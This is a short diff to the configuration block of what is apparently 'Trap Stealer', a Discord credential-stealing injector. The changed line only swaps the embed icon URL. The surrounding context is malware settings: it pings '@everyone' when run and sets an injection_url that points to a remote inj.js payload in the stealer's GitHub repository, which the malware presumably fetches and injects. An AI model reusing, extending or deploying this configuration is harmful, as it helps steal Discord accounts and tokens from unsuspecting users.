@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Trap Stealer Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_icon: 'https://w0.peakpx.com/wallpaper/674/27/HD-wallpaper-felix-argyle-anime-re-zero-thumbnail.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/inj.js', 
   /**
